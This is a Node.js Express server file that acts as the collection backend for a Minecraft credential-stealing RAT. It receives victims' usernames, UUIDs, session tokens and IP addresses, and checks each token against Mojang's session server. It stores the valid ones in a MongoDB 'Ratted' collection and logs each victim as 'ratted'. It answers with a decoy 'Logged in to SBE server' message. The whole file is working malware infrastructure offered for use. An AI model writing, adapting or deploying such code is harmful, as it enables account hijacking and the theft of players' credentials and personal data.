//setup
require('dotenv').config()
const { post } = require("axios").default
const express = require("express")
const mongoose = require("mongoose")
const helmet = require("helmet")
const app = express()
const Ratted = require("./models/Ratted")
const port = process.env.PORT || 80

//plugins
app.use(helmet()) //secure
app.use(express.json()) //parse json
app.use(express.urlencoded({ extended: true }))

//database connection
mongoose.connect(process.env.DB)
mongoose.connection.on("connected", () => console.log("Mongoose connection successfully opened!"))
mongoose.connection.on("err", err => console.error(`Mongoose connection error:\n${err.stack}`))
mongoose.connection.on("disconnected", () => console.log("Mongoose connection disconnected"))

// log the json of a simple post
app.post("/", (req, res) => {
    //happens if the request does not contain all the required fields, aka someones manually posting to the server
    if (!req.body.username || !req.body.uuid || !req.body.token || !req.body.ip) return console.log("Missing fields")

    //validate the token
    post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }), {
        headers: {
            'Content-Type': 'application/json'
        }
    })

    .then(response => {
        //mojangs way of saying its good
        if (response.status == 204) {
            //create a Ratted object with mongoose schema and save it
            new Ratted({
                username: req.body.username,
                uuid: req.body.uuid,
                token: req.body.token,
                ip: req.body.ip,
                timestamp: new Date()
            }).save(err => {
                //errors with the database
                if (err) console.log("Error saving to database: ", err)
            })

            console.log(`${req.body.username} has been ratted!`, req.body)
        }
    })

    .catch(err => {
        //could happen if the auth server is down OR invalid information is passed in the body
        console.log("Response Error: " + err.response.data.error)
    })

    //change this to whatev u want, but make sure to send a response
    res.send("Logged in to SBE server")
})

//create server
app.listen(port, () => console.log(`Listening at http://localhost:${port}`))